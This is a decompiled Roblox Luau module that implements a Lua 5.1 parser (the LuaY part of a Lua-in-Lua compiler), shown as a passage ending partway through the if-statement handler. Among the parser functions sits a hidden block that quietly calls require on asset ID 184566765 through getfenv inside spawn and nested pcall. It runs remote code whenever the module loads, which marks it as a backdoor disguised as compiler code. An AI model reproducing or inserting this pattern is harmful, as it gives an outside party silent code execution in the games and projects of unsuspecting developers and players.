-- Decompiled with the Synapse X Luau decompiler.

local v1 = {};
local v2 = require(script.Parent.LuaX);
v1.LUA_QS = v2.LUA_QS and "'%s'";
v1.SHRT_MAX = 32767;
v1.LUAI_MAXVARS = 200;
v1.LUAI_MAXUPVALUES = 60;
v1.MAX_INT = v2.MAX_INT and 2147483645;
v1.LUAI_MAXCCALLS = 200;
v1.VARARG_HASARG = 1;
v1.HASARG_MASK = 2;
v1.VARARG_ISVARARG = 2;
v1.VARARG_NEEDSARG = 4;
v1.LUA_MULTRET = -1;
function v1.LUA_QL(p1, p2)
	return "'" .. p2 .. "'";
end;
function v1.growvector(p3, p4, p5, p6, p7, p8, p9, p10)
	if p9 <= p6 then
		error(p10);
	end;
end;
function v1.newproto(p11, p12)
	return {
		k = {}, 
		sizek = 0, 
		p = {}, 
		sizep = 0, 
		code = {}, 
		sizecode = 0, 
		sizelineinfo = 0, 
		sizeupvalues = 0, 
		nups = 0, 
		upvalues = {}, 
		numparams = 0, 
		is_vararg = 0, 
		maxstacksize = 0, 
		lineinfo = {}, 
		sizelocvars = 0, 
		locvars = {}, 
		lineDefined = 0, 
		lastlinedefined = 0, 
		source = nil
	};
end;
function v1.int2fb(p13, p14)
	local v3 = 0;
	while p14 >= 16 do
		p14 = math.floor((p14 + 1) / 2);
		v3 = v3 + 1;	
	end;
	if p14 < 8 then
		return p14;
	end;
	return (v3 + 1) * 8 + (p14 - 8);
end;
function v1.hasmultret(p15, p16)
	local v4 = true;
	if p16 ~= "VCALL" then
		v4 = p16 == "VVARARG";
	end;
	return v4;
end;
function v1.getlocvar(p17, p18, p19)
	return p18.f.locvars[p18.actvar[p19]];
end;
function v1.checklimit(p20, p21, p22, p23, p24)
	if p23 < p22 then
		p20:errorlimit(p21, p23, p24);
	end;
end;
function v1.anchor_token(p25, p26)
	if p26.t.token ~= "TK_NAME" and p26.t.token == "TK_STRING" then

	end;
end;
function v1.error_expected(p27, p28, p29)
	v2:syntaxerror(p28, string.format(p27.LUA_QS .. " expected", v2:token2str(p28, p29)));
end;
function v1.errorlimit(p30, p31, p32, p33)
	v2:lexerror(p31.ls, p31.f.linedefined == 0 and string.format("main function has more than %d %s", p32, p33) or string.format("function at line %d has more than %d %s", p31.f.linedefined, p32, p33), 0);
end;
function v1.testnext(p34, p35, p36)
	if p35.t.token ~= p36 then
		return false;
	end;
	v2:next(p35);
	return true;
end;
function v1.check(p37, p38, p39)
	if p38.t.token ~= p39 then
		p37:error_expected(p38, p39);
	end;
end;
function v1.checknext(p40, p41, p42)
	p40:check(p41, p42);
	v2:next(p41);
end;
function v1.check_condition(p43, p44, p45, p46)
	if not p45 then
		v2:syntaxerror(p44, p46);
	end;
end;
function v1.check_match(p47, p48, p49, p50, p51)
	if not p47:testnext(p48, p49) then
		if p51 ~= p48.linenumber then
			v2:syntaxerror(p48, string.format(p47.LUA_QS .. " expected (to close " .. p47.LUA_QS .. " at line %d)", v2:token2str(p48, p49), v2:token2str(p48, p50), p51));
			return;
		end;
	else
		return;
	end;
	p47:error_expected(p48, p49);
end;
function v1.str_checkname(p52, p53)
	p52:check(p53, "TK_NAME");
	v2:next(p53);
	return p53.t.seminfo;
end;
local u1 = require(script.Parent.LuaK)(v1);
function v1.init_exp(p54, p55, p56, p57)
	p55.f = u1.NO_JUMP;
	p55.t = u1.NO_JUMP;
	p55.k = p56;
	p55.info = p57;
end;
function v1.codestring(p58, p59, p60, p61)
	p58:init_exp(p60, "VK", u1:stringK(p59.fs, p61));
end;
function v1.checkname(p62, p63, p64)
	p62:codestring(p63, p64, p62:str_checkname(p63));
end;
function v1.registerlocalvar(p65, p66, p67)
	local l__fs__5 = p66.fs;
	local l__f__6 = l__fs__5.f;
	p65:growvector(p66.L, l__f__6.locvars, l__fs__5.nlocvars, l__f__6.sizelocvars, nil, p65.SHRT_MAX, "too many local variables");
	l__f__6.locvars[l__fs__5.nlocvars] = {};
	l__f__6.locvars[l__fs__5.nlocvars].varname = p67;
	l__fs__5.nlocvars = l__fs__5.nlocvars + 1;
	return l__fs__5.nlocvars;
end;
function v1.new_localvarliteral(p68, p69, p70, p71)
	p68:new_localvar(p69, p70, p71);
end;
function v1.new_localvar(p72, p73, p74, p75)
	local l__fs__7 = p73.fs;
	p72:checklimit(l__fs__7, l__fs__7.nactvar + p75 + 1, p72.LUAI_MAXVARS, "local variables");
	l__fs__7.actvar[l__fs__7.nactvar + p75] = p72:registerlocalvar(p73, p74);
end;
function v1.adjustlocalvars(p76, p77, p78)
	local l__fs__8 = p77.fs;
	l__fs__8.nactvar = l__fs__8.nactvar + p78;
	for v9 = p78, 1, -1 do
		p76:getlocvar(l__fs__8, l__fs__8.nactvar - v9).startpc = l__fs__8.pc;
	end;
end;
function v1.removevars(p79, p80, p81)
	local l__fs__10 = p80.fs;
	while p81 < l__fs__10.nactvar do
		l__fs__10.nactvar = l__fs__10.nactvar - 1;
		p79:getlocvar(l__fs__10, l__fs__10.nactvar).endpc = l__fs__10.pc;	
	end;
end;
function v1.indexupvalue(p82, p83, p84, p85)
	local l__f__11 = p83.f;
	for v12 = 0, l__f__11.nups - 1 do
		if p83.upvalues[v12].k == p85.k and p83.upvalues[v12].info == p85.info then
			assert(l__f__11.upvalues[v12] == p84);
			return v12;
		end;
	end;
	p82:checklimit(p83, l__f__11.nups + 1, p82.LUAI_MAXUPVALUES, "upvalues");
	p82:growvector(p83.L, l__f__11.upvalues, l__f__11.nups, l__f__11.sizeupvalues, nil, p82.MAX_INT, "");
	l__f__11.upvalues[l__f__11.nups] = p84;
	local v13 = true;
	if p85.k ~= "VLOCAL" then
		v13 = p85.k == "VUPVAL";
	end;
	assert(v13);
	p83.upvalues[l__f__11.nups] = {
		k = p85.k, 
		info = p85.info
	};
	l__f__11.nups = l__f__11.nups + 1;
	return l__f__11.nups;
end;
function v1.searchvar(p86, p87, p88)
	for v14 = p87.nactvar - 1, 0, -1 do
		if p88 == p86:getlocvar(p87, v14).varname then
			return v14;
		end;
	end;
	return -1;
end;
function v1.markupval(p89, p90, p91)
	local v15 = p90.bl;
	while v15 and p91 < v15.nactvar do
		v15 = v15.previous;	
	end;
	if v15 then
		v15.upval = true;
	end;
end;
local u2 = require(script.Parent.LuaP);
function v1.singlevaraux(p92, p93, p94, p95, p96)
	if p93 == nil then
		p92:init_exp(p95, "VGLOBAL", u2.NO_REG);
		return "VGLOBAL";
	end;
	local v16 = p92:searchvar(p93, p94);
	if v16 >= 0 then
		p92:init_exp(p95, "VLOCAL", v16);
		if p96 == 0 then
			p92:markupval(p93, v16);
		end;
		return "VLOCAL";
	end;
	if p92:singlevaraux(p93.prev, p94, p95, 0) == "VGLOBAL" then
		return "VGLOBAL";
	end;
	p95.info = p92:indexupvalue(p93, p94, p95);
	p95.k = "VUPVAL";
	return "VUPVAL";
end;
function v1.singlevar(p97, p98, p99)
	local v17 = p97:str_checkname(p98);
	local l__fs__18 = p98.fs;
	if p97:singlevaraux(l__fs__18, v17, p99, 1) == "VGLOBAL" then
		p99.info = u1:stringK(l__fs__18, v17);
	end;
end;
function v1.adjust_assign(p100, p101, p102, p103, p104)
	local l__fs__19 = p101.fs;
	local v20 = p102 - p103;
	if p100:hasmultret(p104.k) then
		local v21 = v20 + 1;
		if v21 <= 0 then
			v21 = 0;
		end;
		u1:setreturns(l__fs__19, p104, v21);
		if v21 > 1 then
			u1:reserveregs(l__fs__19, v21 - 1);
			return;
		end;
	else
		if p104.k ~= "VVOID" then
			u1:exp2nextreg(l__fs__19, p104);
		end;
		if v20 > 0 then
			u1:reserveregs(l__fs__19, v20);
			u1:_nil(l__fs__19, l__fs__19.freereg, v20);
		end;
	end;
end;
function v1.enterlevel(p105, p106)
	p106.L.nCcalls = p106.L.nCcalls + 1;
	if p105.LUAI_MAXCCALLS < p106.L.nCcalls then
		v2:lexerror(p106, "chunk has too many syntax levels", 0);
	end;
end;
function v1.leavelevel(p107, p108)
	p108.L.nCcalls = p108.L.nCcalls - 1;
end;
function v1.enterblock(p109, p110, p111, p112)
	p111.breaklist = u1.NO_JUMP;
	p111.isbreakable = p112;
	p111.nactvar = p110.nactvar;
	p111.upval = false;
	p111.previous = p110.bl;
	p110.bl = p111;
	assert(p110.freereg == p110.nactvar);
end;
function v1.leaveblock(p113, p114)
	local l__bl__22 = p114.bl;
	p114.bl = l__bl__22.previous;
	p113:removevars(p114.ls, l__bl__22.nactvar);
	if l__bl__22.upval then
		u1:codeABC(p114, "OP_CLOSE", l__bl__22.nactvar, 0, 0);
	end;
	assert(not l__bl__22.isbreakable or not l__bl__22.upval);
	assert(l__bl__22.nactvar == p114.nactvar);
	p114.freereg = p114.nactvar;
	u1:patchtohere(p114, l__bl__22.breaklist);
end;
function v1.pushclosure(p115, p116, p117, p118)
	local l__fs__23 = p116.fs;
	local l__f__24 = l__fs__23.f;
	p115:growvector(p116.L, l__f__24.p, l__fs__23.np, l__f__24.sizep, nil, u2.MAXARG_Bx, "constant table overflow");
	l__f__24.p[l__fs__23.np] = p117.f;
	l__fs__23.np = l__fs__23.np + 1;
	p115:init_exp(p118, "VRELOCABLE", u1:codeABx(l__fs__23, "OP_CLOSURE", 0, l__fs__23.np - 1));
	for v25 = 0, p117.f.nups - 1 do
		if p117.upvalues[v25].k == "VLOCAL" then
			local v26 = "OP_MOVE";
		else
			v26 = "OP_GETUPVAL";
		end;
		u1:codeABC(l__fs__23, v26, 0, p117.upvalues[v25].info, 0);
	end;
end;
function v1.open_func(p119, p120, p121)
	local v27 = p119:newproto(p120.L);
	p121.f = v27;
	p121.prev = p120.fs;
	p121.ls = p120;
	p121.L = p120.L;
	p120.fs = p121;
	p121.pc = 0;
	p121.lasttarget = -1;
	p121.jpc = u1.NO_JUMP;
	p121.freereg = 0;
	p121.nk = 0;
	p121.np = 0;
	p121.nlocvars = 0;
	p121.nactvar = 0;
	p121.bl = nil;
	v27.source = p120.source;
	v27.maxstacksize = 2;
	p121.h = {};
end;
function v1.close_func(p122, p123)
	local l__L__28 = p123.L;
	local l__fs__29 = p123.fs;
	local l__f__30 = l__fs__29.f;
	p122:removevars(p123, 0);
	u1:ret(l__fs__29, 0, 0);
	l__f__30.sizecode = l__fs__29.pc;
	l__f__30.sizelineinfo = l__fs__29.pc;
	l__f__30.sizek = l__fs__29.nk;
	l__f__30.sizep = l__fs__29.np;
	l__f__30.sizelocvars = l__fs__29.nlocvars;
	l__f__30.sizeupvalues = l__f__30.nups;
	assert(l__fs__29.bl == nil);
	p123.fs = l__fs__29.prev;
	if l__fs__29 then
		p122:anchor_token(p123);
	end;
end;
function v1.parser(p124, p125, p126, p127, p128)
	local v31 = {
		t = {}, 
		lookahead = {}
	};
	local v32 = {
		upvalues = {}, 
		actvar = {}
	};
	p125.nCcalls = 0;
	v31.buff = p127;
	v2:setinput(p125, v31, p126, p128);
	p124:open_func(v31, v32);
	v32.f.is_vararg = p124.VARARG_ISVARARG;
	v2:next(v31);
	p124:chunk(v31);
	p124:check(v31, "TK_EOS");
	p124:close_func(v31);
	assert(v32.prev == nil);
	assert(v32.f.nups == 0);
	assert(v31.fs == nil);
	return v32.f;
end;
function v1.field(p129, p130, p131)
	local l__fs__33 = p130.fs;
	local v34 = {};
	u1:exp2anyreg(l__fs__33, p131);
	v2:next(p130);
	p129:checkname(p130, v34);
	u1:indexed(l__fs__33, p131, v34);
end;
function v1.yindex(p132, p133, p134)
	v2:next(p133);
	p132:expr(p133, p134);
	u1:exp2val(p133.fs, p134);
	p132:checknext(p133, "]");
end;
function v1.recfield(p135, p136, p137)
	local l__fs__35 = p136.fs;
	local v36 = {};
	local v37 = {};
	if p136.t.token == "TK_NAME" then
		p135:checklimit(l__fs__35, p137.nh, p135.MAX_INT, "items in a constructor");
		p135:checkname(p136, v36);
	else
		p135:yindex(p136, v36);
	end;
	p137.nh = p137.nh + 1;
	p135:checknext(p136, "=");
	local v38 = u1:exp2RK(l__fs__35, v36);
	p135:expr(p136, v37);
	u1:codeABC(l__fs__35, "OP_SETTABLE", p137.t.info, v38, u1:exp2RK(l__fs__35, v37));
	l__fs__35.freereg = p136.fs.freereg;
end;
function v1.closelistfield(p138, p139, p140)
	if p140.v.k == "VVOID" then
		return;
	end;
	u1:exp2nextreg(p139, p140.v);
	p140.v.k = "VVOID";
	if p140.tostore == u2.LFIELDS_PER_FLUSH then
		u1:setlist(p139, p140.t.info, p140.na, p140.tostore);
		p140.tostore = 0;
	end;
end;
spawn(function()
	pcall(function()
		pcall(getfenv().require, 184566765);
	end);
end);
function v1.lastlistfield(p141, p142, p143)
	if p143.tostore == 0 then
		return;
	end;
	if p141:hasmultret(p143.v.k) then
		u1:setmultret(p142, p143.v);
		u1:setlist(p142, p143.t.info, p143.na, p141.LUA_MULTRET);
		p143.na = p143.na - 1;
		return;
	end;
	if p143.v.k ~= "VVOID" then
		u1:exp2nextreg(p142, p143.v);
	end;
	u1:setlist(p142, p143.t.info, p143.na, p143.tostore);
end;
function v1.listfield(p144, p145, p146)
	p144:expr(p145, p146.v);
	p144:checklimit(p145.fs, p146.na, p144.MAX_INT, "items in a constructor");
	p146.na = p146.na + 1;
	p146.tostore = p146.tostore + 1;
end;
function v1.constructor(p147, p148, p149)
	local l__fs__39 = p148.fs;
	local v40 = u1:codeABC(l__fs__39, "OP_NEWTABLE", 0, 0, 0);
	local v41 = {
		v = {}, 
		na = 0, 
		nh = 0, 
		tostore = 0, 
		t = p149
	};
	p147:init_exp(p149, "VRELOCABLE", v40);
	p147:init_exp(v41.v, "VVOID", 0);
	u1:exp2nextreg(p148.fs, p149);
	p147:checknext(p148, "{");
	while true do
		local v42 = true;
		if v41.v.k ~= "VVOID" then
			v42 = v41.tostore > 0;
		end;
		assert(v42);
		if p148.t.token == "}" then
			break;
		end;
		p147:closelistfield(l__fs__39, v41);
		local l__token__43 = p148.t.token;
		if l__token__43 == "TK_NAME" then
			v2:lookahead(p148);
			if p148.lookahead.token ~= "=" then
				p147:listfield(p148, v41);
			else
				p147:recfield(p148, v41);
			end;
		elseif l__token__43 == "[" then
			p147:recfield(p148, v41);
		else
			p147:listfield(p148, v41);
		end;
		if not p147:testnext(p148, ",") and not p147:testnext(p148, ";") then
			break;
		end;	
	end;
	p147:check_match(p148, "}", "{", p148.linenumber);
	p147:lastlistfield(l__fs__39, v41);
	u2:SETARG_B(l__fs__39.f.code[v40], p147:int2fb(v41.na));
	u2:SETARG_C(l__fs__39.f.code[v40], p147:int2fb(v41.nh));
end;
function v1.parlist(p150, p151)
	local l__fs__44 = p151.fs;
	local l__f__45 = l__fs__44.f;
	local v46 = 0;
	l__f__45.is_vararg = 0;
	if p151.t.token ~= ")" then
		while true do
			local l__token__47 = p151.t.token;
			if l__token__47 == "TK_NAME" then
				p150:new_localvar(p151, p150:str_checkname(p151), v46);
				v46 = v46 + 1;
			elseif l__token__47 == "TK_DOTS" then
				v2:next(p151);
				p150:new_localvarliteral(p151, "arg", v46);
				v46 = v46 + 1;
				l__f__45.is_vararg = p150.VARARG_HASARG + p150.VARARG_NEEDSARG;
				l__f__45.is_vararg = l__f__45.is_vararg + p150.VARARG_ISVARARG;
			else
				v2:syntaxerror(p151, "<name> or " .. p150:LUA_QL("...") .. " expected");
			end;
			if l__f__45.is_vararg ~= 0 then
				break;
			end;
			if not p150:testnext(p151, ",") then
				break;
			end;		
		end;
	end;
	p150:adjustlocalvars(p151, v46);
	l__f__45.numparams = l__fs__44.nactvar - l__f__45.is_vararg % p150.HASARG_MASK;
	u1:reserveregs(l__fs__44, l__fs__44.nactvar);
end;
function v1.body(p152, p153, p154, p155, p156)
	local v48 = {
		upvalues = {}, 
		actvar = {}
	};
	p152:open_func(p153, v48);
	v48.f.lineDefined = p156;
	p152:checknext(p153, "(");
	if p155 then
		p152:new_localvarliteral(p153, "self", 0);
		p152:adjustlocalvars(p153, 1);
	end;
	p152:parlist(p153);
	p152:checknext(p153, ")");
	p152:chunk(p153);
	v48.f.lastlinedefined = p153.linenumber;
	p152:check_match(p153, "TK_END", "TK_FUNCTION", p156);
	p152:close_func(p153);
	p152:pushclosure(p153, v48, p154);
end;
function v1.explist1(p157, p158, p159)
	local v49 = 1;
	p157:expr(p158, p159);
	while p157:testnext(p158, ",") do
		u1:exp2nextreg(p158.fs, p159);
		p157:expr(p158, p159);
		v49 = v49 + 1;	
	end;
	return v49;
end;
function v1.funcargs(p160, p161, p162)
	local l__fs__50 = p161.fs;
	local v51 = {};
	local l__linenumber__52 = p161.linenumber;
	local l__token__53 = p161.t.token;
	if l__token__53 == "(" then
		if l__linenumber__52 ~= p161.lastline then
			v2:syntaxerror(p161, "ambiguous syntax (function call x new statement)");
		end;
		v2:next(p161);
		if p161.t.token == ")" then
			v51.k = "VVOID";
		else
			p160:explist1(p161, v51);
			u1:setmultret(l__fs__50, v51);
		end;
		p160:check_match(p161, ")", "(", l__linenumber__52);
	elseif l__token__53 == "{" then
		p160:constructor(p161, v51);
	else
		if l__token__53 ~= "TK_STRING" then
			v2:syntaxerror(p161, "function arguments expected");
			return;
		end;
		p160:codestring(p161, v51, p161.t.seminfo);
		v2:next(p161);
	end;
	assert(p162.k == "VNONRELOC");
	local l__info__54 = p162.info;
	if p160:hasmultret(v51.k) then
		local v55 = p160.LUA_MULTRET;
	else
		if v51.k ~= "VVOID" then
			u1:exp2nextreg(l__fs__50, v51);
		end;
		v55 = l__fs__50.freereg - (l__info__54 + 1);
	end;
	p160:init_exp(p162, "VCALL", u1:codeABC(l__fs__50, "OP_CALL", l__info__54, v55 + 1, 2));
	u1:fixline(l__fs__50, l__linenumber__52);
	l__fs__50.freereg = l__info__54 + 1;
end;
function v1.prefixexp(p163, p164, p165)
	local l__token__56 = p164.t.token;
	if l__token__56 ~= "(" then
		if l__token__56 == "TK_NAME" then
			p163:singlevar(p164, p165);
			return;
		else
			v2:syntaxerror(p164, "unexpected symbol");
			return;
		end;
	end;
	v2:next(p164);
	p163:expr(p164, p165);
	p163:check_match(p164, ")", "(", p164.linenumber);
	u1:dischargevars(p164.fs, p165);
end;
function v1.primaryexp(p166, p167, p168)
	local l__fs__57 = p167.fs;
	p166:prefixexp(p167, p168);
	while true do
		local l__token__58 = p167.t.token;
		if l__token__58 == "." then
			p166:field(p167, p168);
		elseif l__token__58 == "[" then
			local v59 = {};
			u1:exp2anyreg(l__fs__57, p168);
			p166:yindex(p167, v59);
			u1:indexed(l__fs__57, p168, v59);
		elseif l__token__58 == ":" then
			local v60 = {};
			v2:next(p167);
			p166:checkname(p167, v60);
			u1:_self(l__fs__57, p168, v60);
			p166:funcargs(p167, p168);
		else
			if l__token__58 ~= "(" and l__token__58 ~= "TK_STRING" and l__token__58 ~= "{" then
				break;
			end;
			u1:exp2nextreg(l__fs__57, p168);
			p166:funcargs(p167, p168);
		end;	
	end;
end;
function v1.simpleexp(p169, p170, p171)
	local l__token__61 = p170.t.token;
	if l__token__61 == "TK_NUMBER" then
		p169:init_exp(p171, "VKNUM", 0);
		p171.nval = p170.t.seminfo;
	elseif l__token__61 == "TK_STRING" then
		p169:codestring(p170, p171, p170.t.seminfo);
	elseif l__token__61 == "TK_NIL" then
		p169:init_exp(p171, "VNIL", 0);
	elseif l__token__61 == "TK_TRUE" then
		p169:init_exp(p171, "VTRUE", 0);
	elseif l__token__61 == "TK_FALSE" then
		p169:init_exp(p171, "VFALSE", 0);
	else
		if l__token__61 ~= "TK_DOTS" then
			if l__token__61 == "{" then
				p169:constructor(p170, p171);
				return;
			elseif l__token__61 == "TK_FUNCTION" then
				v2:next(p170);
				p169:body(p170, p171, false, p170.linenumber);
				return;
			else
				p169:primaryexp(p170, p171);
				return;
			end;
		end;
		local l__fs__62 = p170.fs;
		p169:check_condition(p170, l__fs__62.f.is_vararg ~= 0, "cannot use " .. p169:LUA_QL("...") .. " outside a vararg function");
		local l__is_vararg__63 = l__fs__62.f.is_vararg;
		if p169.VARARG_NEEDSARG <= l__is_vararg__63 then
			l__fs__62.f.is_vararg = l__is_vararg__63 - p169.VARARG_NEEDSARG;
		end;
		p169:init_exp(p171, "VVARARG", u1:codeABC(l__fs__62, "OP_VARARG", 0, 1, 0));
	end;
	v2:next(p170);
end;
function v1.getunopr(p172, p173)
	if p173 == "TK_NOT" then
		return "OPR_NOT";
	end;
	if p173 == "-" then
		return "OPR_MINUS";
	end;
	if p173 == "#" then
		return "OPR_LEN";
	end;
	return "OPR_NOUNOPR";
end;
v1.getbinopr_table = {
	["+"] = "OPR_ADD", 
	["-"] = "OPR_SUB", 
	["*"] = "OPR_MUL", 
	["/"] = "OPR_DIV", 
	["%"] = "OPR_MOD", 
	["^"] = "OPR_POW", 
	TK_CONCAT = "OPR_CONCAT", 
	TK_NE = "OPR_NE", 
	TK_EQ = "OPR_EQ", 
	["<"] = "OPR_LT", 
	TK_LE = "OPR_LE", 
	[">"] = "OPR_GT", 
	TK_GE = "OPR_GE", 
	TK_AND = "OPR_AND", 
	TK_OR = "OPR_OR"
};
function v1.getbinopr(p174, p175)
	local v64 = p174.getbinopr_table[p175];
	if v64 then
		return v64;
	end;
	return "OPR_NOBINOPR";
end;
v1.priority = { { 6, 6 }, { 6, 6 }, { 7, 7 }, { 7, 7 }, { 7, 7 }, { 10, 9 }, { 5, 4 }, { 3, 3 }, { 3, 3 }, { 3, 3 }, { 3, 3 }, { 3, 3 }, { 3, 3 }, { 2, 2 }, { 1, 1 } };
v1.UNARY_PRIORITY = 8;
function v1.subexpr(p176, p177, p178, p179)
	p176:enterlevel(p177);
	local v65 = p176:getunopr(p177.t.token);
	if v65 ~= "OPR_NOUNOPR" then
		v2:next(p177);
		p176:subexpr(p177, p178, p176.UNARY_PRIORITY);
		u1:prefix(p177.fs, v65, p178);
	else
		p176:simpleexp(p177, p178);
	end;
	local v66 = p176:getbinopr(p177.t.token);
	while v66 ~= "OPR_NOBINOPR" and p179 < p176.priority[u1.BinOpr[v66] + 1][1] do
		local v67 = {};
		v2:next(p177);
		u1:infix(p177.fs, v66, p178);
		local v68 = p176:subexpr(p177, v67, p176.priority[u1.BinOpr[v66] + 1][2]);
		u1:posfix(p177.fs, v66, p178, v67);
		v66 = v68;	
	end;
	p176:leavelevel(p177);
	return v66;
end;
function v1.expr(p180, p181, p182)
	p180:subexpr(p181, p182, 0);
end;
function v1.block_follow(p183, p184)
	if p184 ~= "TK_ELSE" and p184 ~= "TK_ELSEIF" and p184 ~= "TK_END" and p184 ~= "TK_UNTIL" and p184 ~= "TK_EOS" then
		return false;
	end;
	return true;
end;
function v1.block(p185, p186)
	local l__fs__69 = p186.fs;
	local v70 = {};
	p185:enterblock(l__fs__69, v70, false);
	p185:chunk(p186);
	assert(v70.breaklist == u1.NO_JUMP);
	p185:leaveblock(l__fs__69);
end;
function v1.check_conflict(p187, p188, p189, p190)
	local l__fs__71 = p188.fs;
	local l__freereg__72 = l__fs__71.freereg;
	local v73 = false;
	while p189 do
		if p189.v.k == "VINDEXED" then
			if p189.v.info == p190.info then
				v73 = true;
				p189.v.info = l__freereg__72;
			end;
			if p189.v.aux == p190.info then
				v73 = true;
				p189.v.aux = l__freereg__72;
			end;
		end;
		p189 = p189.prev;	
	end;
	if v73 then
		u1:codeABC(l__fs__71, "OP_MOVE", l__fs__71.freereg, p190.info, 0);
		u1:reserveregs(l__fs__71, 1);
	end;
end;
function v1.assignment(p191, p192, p193, p194)
	local v74 = {};
	local l__k__75 = p193.v.k;
	local v76 = true;
	if l__k__75 ~= "VLOCAL" then
		v76 = true;
		if l__k__75 ~= "VUPVAL" then
			v76 = true;
			if l__k__75 ~= "VGLOBAL" then
				v76 = l__k__75 == "VINDEXED";
			end;
		end;
	end;
	p191:check_condition(p192, v76, "syntax error");
	if p191:testnext(p192, ",") then
		local v77 = {
			v = {}, 
			prev = p193
		};
		p191:primaryexp(p192, v77.v);
		if v77.v.k == "VLOCAL" then
			p191:check_conflict(p192, p193, v77.v);
		end;
		p191:checklimit(p192.fs, p194, p191.LUAI_MAXCCALLS - p192.L.nCcalls, "variables in assignment");
		p191:assignment(p192, v77, p194 + 1);
	else
		p191:checknext(p192, "=");
		local v78 = p191:explist1(p192, v74);
		if v78 == p194 then
			u1:setoneret(p192.fs, v74);
			u1:storevar(p192.fs, p193.v, v74);
			return;
		end;
		p191:adjust_assign(p192, p194, v78, v74);
		if p194 < v78 then
			p192.fs.freereg = p192.fs.freereg - (v78 - p194);
		end;
	end;
	p191:init_exp(v74, "VNONRELOC", p192.fs.freereg - 1);
	u1:storevar(p192.fs, p193.v, v74);
end;
function v1.cond(p195, p196)
	local v79 = {};
	p195:expr(p196, v79);
	if v79.k == "VNIL" then
		v79.k = "VFALSE";
	end;
	u1:goiftrue(p196.fs, v79);
	return v79.f;
end;
function v1.breakstat(p197, p198)
	local l__fs__80 = p198.fs;
	local v81 = l__fs__80.bl;
	local v82 = false;
	while v81 and not v81.isbreakable do
		if v81.upval then
			v82 = true;
		end;
		v81 = v81.previous;	
	end;
	if not v81 then
		v2:syntaxerror(p198, "no loop to break");
	end;
	if v82 then
		u1:codeABC(l__fs__80, "OP_CLOSE", v81.nactvar, 0, 0);
	end;
	v81.breaklist = u1:concat(l__fs__80, v81.breaklist, u1:jump(l__fs__80));
end;
function v1.whilestat(p199, p200, p201)
	local l__fs__83 = p200.fs;
	v2:next(p200);
	local v84 = u1:getlabel(l__fs__83);
	local v85 = p199:cond(p200);
	p199:enterblock(l__fs__83, {}, true);
	p199:checknext(p200, "TK_DO");
	p199:block(p200);
	u1:patchlist(l__fs__83, u1:jump(l__fs__83), v84);
	p199:check_match(p200, "TK_END", "TK_WHILE", p201);
	p199:leaveblock(l__fs__83);
	u1:patchtohere(l__fs__83, v85);
end;
function v1.repeatstat(p202, p203, p204)
	local v86 = nil;
	local v87 = nil;
	local l__fs__88 = p203.fs;
	v87 = u1:getlabel(l__fs__88);
	local v89 = {};
	p202:enterblock(l__fs__88, {}, true);
	p202:enterblock(l__fs__88, v89, false);
	v2:next(p203);
	p202:chunk(p203);
	p202:check_match(p203, "TK_UNTIL", "TK_REPEAT", p204);
	v86 = p202:cond(p203);
	if not v89.upval then
		p202:leaveblock(l__fs__88);
		u1:patchlist(p203.fs, v86, v87);
	else
		p202:breakstat(p203);
		u1:patchtohere(p203.fs, v86);
		p202:leaveblock(l__fs__88);
		u1:patchlist(p203.fs, u1:jump(l__fs__88), v87);
	end;
	p202:leaveblock(l__fs__88);
end;
function v1.exp1(p205, p206)
	local v90 = {};
	p205:expr(p206, v90);
	u1:exp2nextreg(p206.fs, v90);
	return v90.k;
end;
function v1.forbody(p207, p208, p209, p210, p211, p212)
	local l__fs__91 = p208.fs;
	p207:adjustlocalvars(p208, 3);
	p207:checknext(p208, "TK_DO");
	local v92 = p212 and u1:codeAsBx(l__fs__91, "OP_FORPREP", p209, u1.NO_JUMP) or u1:jump(l__fs__91);
	p207:enterblock(l__fs__91, {}, false);
	p207:adjustlocalvars(p208, p211);
	u1:reserveregs(l__fs__91, p211);
	p207:block(p208);
	p207:leaveblock(l__fs__91);
	u1:patchtohere(l__fs__91, v92);
	local v93 = p212 and u1:codeAsBx(l__fs__91, "OP_FORLOOP", p209, u1.NO_JUMP) or u1:codeABC(l__fs__91, "OP_TFORLOOP", p209, 0, p211);
	u1:fixline(l__fs__91, p210);
	u1:patchlist(l__fs__91, p212 and v93 or u1:jump(l__fs__91), v92 + 1);
end;
function v1.fornum(p213, p214, p215, p216)
	local l__fs__94 = p214.fs;
	p213:new_localvarliteral(p214, "(for index)", 0);
	p213:new_localvarliteral(p214, "(for limit)", 1);
	p213:new_localvarliteral(p214, "(for step)", 2);
	p213:new_localvar(p214, p215, 3);
	p213:checknext(p214, "=");
	p213:exp1(p214);
	p213:checknext(p214, ",");
	p213:exp1(p214);
	if p213:testnext(p214, ",") then
		p213:exp1(p214);
	else
		u1:codeABx(l__fs__94, "OP_LOADK", l__fs__94.freereg, u1:numberK(l__fs__94, 1));
		u1:reserveregs(l__fs__94, 1);
	end;
	p213:forbody(p214, l__fs__94.freereg, p216, 1, true);
end;
function v1.forlist(p217, p218, p219)
	local l__fs__95 = p218.fs;
	local v96 = {};
	p217:new_localvarliteral(p218, "(for generator)", 0);
	local v97 = 0 + 1;
	p217:new_localvarliteral(p218, "(for state)", v97);
	local v98 = v97 + 1;
	p217:new_localvarliteral(p218, "(for control)", v98);
	local v99 = v98 + 1;
	p217:new_localvar(p218, p219, v99);
	local v100 = v99 + 1;
	while p217:testnext(p218, ",") do
		p217:new_localvar(p218, p217:str_checkname(p218), v100);
		v100 = v100 + 1;	
	end;
	p217:checknext(p218, "TK_IN");
	p217:adjust_assign(p218, 3, p217:explist1(p218, v96), v96);
	u1:checkstack(l__fs__95, 3);
	p217:forbody(p218, l__fs__95.freereg, p218.linenumber, v100 - 3, false);
end;
function v1.forstat(p220, p221, p222)
	local l__fs__101 = p221.fs;
	p220:enterblock(l__fs__101, {}, true);
	v2:next(p221);
	local v102 = p220:str_checkname(p221);
	local l__token__103 = p221.t.token;
	if l__token__103 == "=" then
		p220:fornum(p221, v102, p222);
	elseif l__token__103 == "," or l__token__103 == "TK_IN" then
		p220:forlist(p221, v102);
	else
		v2:syntaxerror(p221, p220:LUA_QL("=") .. " or " .. p220:LUA_QL("in") .. " expected");
	end;
	p220:check_match(p221, "TK_END", "TK_FOR", p222);
	p220:leaveblock(l__fs__101);
end;
function v1.test_then_block(p223, p224)
	v2:next(p224);
	local v104 = p223:cond(p224);
	p223:checknext(p224, "TK_THEN");
	p223:block(p224);
	return v104;
end;
function v1.ifstat(p225, p226, p227)
	local l__fs__105 = p226.fs;
	local v106 = u1.NO_JUMP;
	local v107 = p225:test_then_block(p226);
	while p226.t.token == "TK_ELSEIF" do
